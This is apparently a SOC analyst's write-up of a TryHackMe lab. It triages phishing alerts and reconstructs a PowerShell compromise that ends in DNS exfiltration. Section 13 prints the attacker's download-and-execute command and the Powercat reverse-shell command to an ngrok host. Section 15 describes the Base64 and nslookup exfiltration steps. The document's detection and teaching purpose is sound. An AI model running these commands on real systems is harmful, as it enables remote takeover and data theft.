# 1. Executive Summary

This investigation covered a live phishing attack unfolding within the TryHatMe corporate environment.

A total of **36 alerts** were investigated. Most Low-severity alerts were determined to be either legitimate Windows activity or alerts generated by an overly broad external-email detection rule. However, multiple alerts were successfully correlated into a single active compromise involving workstation `win-3450`, assigned to **Michael Ascot, CEO**.

The investigation identified a complete attack chain involving:

1. Phishing activity targeting the organization.
2. Malicious PowerShell execution using `-ExecutionPolicy Bypass`.
3. Remote retrieval of Powercat using PowerShell `DownloadString`.
4. Execution of Powercat using `IEX`.
5. Establishment of a reverse PowerShell shell through an ngrok tunnel.
6. Mapping of the sensitive `SSF-FinancialRecords` network share.
7. Collection and staging of data using `Robocopy`.
8. Creation/use of `exfilt8me.zip`.
9. Base64 encoding of collected data.
10. DNS-based data exfiltration using `nslookup.exe`.
11. Transmission of multiple encoded data chunks to `haz4rdw4re.io`.

The ten High-severity alerts from `1025` through `1034` were initially presented as individual alerts. Correlation showed that they represented **one continuous DNS exfiltration operation**, with each alert containing a different chunk of the same encoded data.

Reconstructing and decoding the chunks revealed evidence of business documents and ultimately produced the TryHackMe flag:

`THM{1497321f4f6f059a52dfb124fb16566e}`

The investigation therefore established evidence of **active compromise, unauthorized remote access, sensitive data collection, staging, and DNS-based exfiltration** from `win-3450`.

# 5. Initial Triage Strategy

The investigation followed a priority-based SOC workflow:

1. High-severity alerts were prioritized.
2. Medium-severity alerts were investigated next.
3. Low-severity alerts were reviewed for correlation and detection noise.
4. Related alerts were grouped into incidents rather than automatically treating every alert as an independent compromise.
5. Parent-child relationships, command lines, paths, hosts, users, timestamps, and network activity were correlated.
6. Legitimate Windows processes were compared against expected execution patterns.
7. Suspicious activity was correlated across email, process, file, and DNS telemetry.

A key lesson from the investigation was that **alert severity and incident severity are not necessarily the same thing**.

Several Low alerts became important once correlated with activity on the compromised host, while multiple other Low alerts represented completely legitimate Windows behavior.

# 7. External Email Detection Rule

Several Low alerts were generated because emails originated from external domains.

The SOC Lead explicitly noted that this detection rule required fine-tuning.

Examples included emails from:

- `gmail.com`
- `.online`
- `.xyz`
- `.me`

Some of these messages were clearly spam or phishing-like in content.

However, an important distinction was made during the investigation:

**The email can be suspicious while the specific detection alert is still a False Positive.**

For the Low email alerts where there was no evidence of execution, malicious attachment, malicious URL, or compromise, the alert was classified as False Positive because the external-domain detection rule was too broad.

Recommended improvement:

- Do not flag an email solely because it is externally sourced.
- Incorporate sender reputation.
- Analyze URLs.
- Analyze attachments.
- Analyze message content.
- Correlate with user interaction.
- Correlate with endpoint execution.
- Use threat intelligence where available.

**True Positive**

- Suspicious external sender.
- Suspicious sender domain.

- Urgency.
- Threat of account suspension.

**The email represents a genuine phishing event even though the attached file did not contain detectable malware.**

The key lesson is:

**A clean attachment does not make a phishing email benign.**

Future phishing investigations should evaluate the entire event:

**Who → What → Where → When → Why → Impact**

rather than focusing on one artifact.

# 13. Malicious PowerShell Activity

The investigation identified malicious PowerShell activity including:

`powershell.exe -ExecutionPolicy Bypass`

and:

`IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimirhino/powercat/master/powercat.ps1')`

followed by:

`powercat -c 2.tcp.ngrok.io -p 19282 -e powershell`

This activity demonstrates multiple stages.

## Execution Policy Bypass

`-ExecutionPolicy Bypass`

indicates an attempt to bypass normal PowerShell execution restrictions.

## Remote Payload Retrieval

`DownloadString(...)`

was used to retrieve the Powercat PowerShell script.

## Direct Execution

`IEX`

was used to execute the retrieved PowerShell content.

## Reverse Shell

Powercat was configured to connect to:

`2.tcp.ngrok.io`

on:

`19282`

and execute:

`powershell`

This establishes a reverse PowerShell shell and provides the attacker with remote command execution.

# 15. Data Staging

The investigation identified:

`C:\Users\michael.ascot\Downloads\exfiltration\`

and:

`exfilt8me.zip`

The PowerShell command used to prepare the data included:

`[System.IO.File]::ReadAllBytes("C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip")`

The file was then converted to Base64:

`[System.Convert]::ToBase64String(...)`

The resulting Base64 data was split into chunks:

`$base64 -split '(.{1,30})'`

Each chunk was then sent through:

`nslookup`

using:

`*.haz4rdw4re.io`

This establishes the mechanism used for DNS-based exfiltration.

# 16. DNS Exfiltration

Alerts `1025–1034` were all High severity.

They initially appeared to be separate alerts, but correlation demonstrated that they were part of one continuous exfiltration operation.

Common characteristics included:

- Host: `win-3450`
- User: Michael Ascot
- Parent: `powershell.exe`
- Child: `nslookup.exe`
- Destination: `haz4rdw4re.io`
- Encoded data in the DNS subdomain
- Exfiltration-related working directory
- Multiple different Base64 chunks

The attacker's PowerShell script explicitly performed:

1. Read `exfilt8me.zip`.
2. Convert the file to Base64.
3. Split the Base64 string into chunks.
4. Execute `nslookup` for each chunk.
5. Append `haz4rdw4re.io` as the destination domain.

This is characteristic of **DNS tunneling/data exfiltration**.

# 21. Attacker Intent

The observed activity indicates a multi-stage compromise rather than a simple phishing attempt.

The likely objectives were:

## Initial Access

Use phishing/social engineering to gain the user's attention and potentially establish an initial foothold.

## Execution

Use PowerShell with execution-policy bypass to execute attacker-controlled code.

## Command and Control

Use Powercat and an ngrok tunnel to establish an externally controlled reverse shell.

## Discovery / Post-Exploitation

Deploy PowerView, potentially for additional network or domain reconnaissance.

## Collection

Access the sensitive:

`SSF-FinancialRecords`

network share.

## Staging

Copy data from the network share into:

`Downloads\exfiltration`

and package the collected data into:

`exfilt8me.zip`

## Exfiltration

Encode the collected data using Base64 and transfer it externally through DNS queries.

The observed sequence demonstrates a clear progression from **initial access to execution, command and control, collection, staging, and exfiltration**.

# 26. Detection Engineering Recommendations

The investigation identified opportunities to improve the detection environment.

## External Email Detection

The existing rule appears overly broad.

Instead of:

`External sender + unusual TLD = alert`

consider correlation using:

- Sender reputation.
- Domain age.
- URL reputation.
- Attachment reputation.
- Message urgency.
- Credential/payment requests.
- Brand impersonation.
- User interaction.
- Endpoint execution following email delivery.

## PowerShell Detection

High-value detection opportunities include:

- `-ExecutionPolicy Bypass`
- `DownloadString`
- `IEX`
- Powercat strings.
- Base64 encoding/decoding.
- Network connections initiated by PowerShell.
- PowerShell spawning `nslookup.exe`.
- PowerShell spawning `net.exe`.
- PowerShell spawning `Robocopy.exe`.

## DNS Exfiltration Detection

Potential detection logic:

- `nslookup.exe` spawned by PowerShell.
- Long or high-entropy subdomains.
- Repeated queries to the same uncommon domain.
- Base64-like subdomain labels.
- High-frequency DNS requests.
- Large numbers of unique subdomains.
- DNS requests originating from unusual processes.

## Process Parent/Child Detection

Legitimate Windows process relationships should be whitelisted or risk-adjusted where appropriate.

Examples:

- `services.exe → TrustedInstaller.exe`
- `services.exe → WUDFHost.exe`
- `services.exe → svchost.exe`
- `svchost.exe → taskhostw.exe`
- `svchost.exe → rdpclip.exe`

This would reduce alert fatigue and allow analysts to focus on higher-value anomalies.

# 27. SOC Lessons Learned

## 27.1 Investigate the Entire Event

A clean file does not necessarily mean a benign email.

Alert classification must consider:

- Sender
- Recipient
- Content
- Attachment
- URLs
- User role
- Endpoint activity
- Subsequent behavior

This was demonstrated by Alert `1005`.

## 27.2 Context Changes Severity

A command such as:

`net use Z: /delete`

is normally harmless.

But when it occurs immediately after:

- mapping a sensitive share,
- copying its contents,
- and before confirmed exfiltration,

the same command becomes meaningful evidence of attacker activity.

## 27.3 Correlation Is Critical

The most important evidence was not contained in one alert.

The incident became clear only after correlating:

- Email
- PowerShell
- DNS
- Network share activity
- Robocopy
- File staging
- Archive creation
- nslookup
- Encoded data

## 27.4 Multiple Alerts Can Be One Incident

Alerts `1025–1034` represented a single continuous DNS exfiltration operation.

Treating them as ten independent incidents would have created unnecessary work and distorted the attack narrative.

## 27.5 Explain Attacker Intent

A strong SOC report should not only explain:

**What happened?**

It should also explain:

**Why did the attacker do it?**

For example:

`PowerShell → execution`

`Powercat/ngrok → remote control`

`Network share → access sensitive data`

`Robocopy → collect/stage data`

`Base64 → encode data`

`DNS → exfiltrate data`

This provides stakeholders with a much clearer understanding of the threat.

## 27.6 Explain the Contribution of Each Alert

Even when several alerts belong to one incident, each alert should explain what new evidence it contributes.

For example:

- One alert establishes the initial DNS exfiltration.
- Another demonstrates continuation.
- Another provides additional encoded data.
- Another reveals recognizable data content.
- The final chunks complete the reconstructed dataset.

This avoids simply copying the same explanation into every alert report.

## 27.7 Include Full Context in False Positive Reports

False Positive reports should consistently identify:

- Who was involved.
- Their role where known.
- Which host or system generated the activity.
- Where the activity originated.
- What systems or resources could have been affected.
- Why the observed behavior was determined to be benign.
- Whether any evidence of compromise or impact was identified.

This makes the report more useful to another analyst reviewing the case later.

# 30. Key Takeaways for Future SOC Investigations

The following methodology will be applied to future investigations:

1. **Do not trust a single artifact.**
2. **Evaluate the entire context of the event.**
3. **Identify who, what, where, when, why, and impact.**
4. **Correlate alerts across hosts, users, processes, files, network activity, and timestamps.**
5. **Distinguish alert classification from the nature of the underlying activity.**
6. **Do not automatically classify suspicious emails as False Positive simply because an attachment is clean.**
7. **Explain attacker intent whenever malicious activity is identified.**
8. **When multiple alerts represent one attack, correlate them into a single incident.**
9. **Explain the unique contribution of each correlated alert.**
10. **Use evidence-based conclusions and avoid assumptions that cannot be supported by telemetry.**
11. **Prioritize containment when active compromise or exfiltration is confirmed.**
12. **Use detection engineering feedback to reduce recurring false positives.**
13. **Include users, roles, hosts, source, destination, and potential impact when documenting False Positives.**
14. **Avoid relying on templated explanations when multiple alerts belong to the same incident; explain the specific evidence contributed by each alert.**
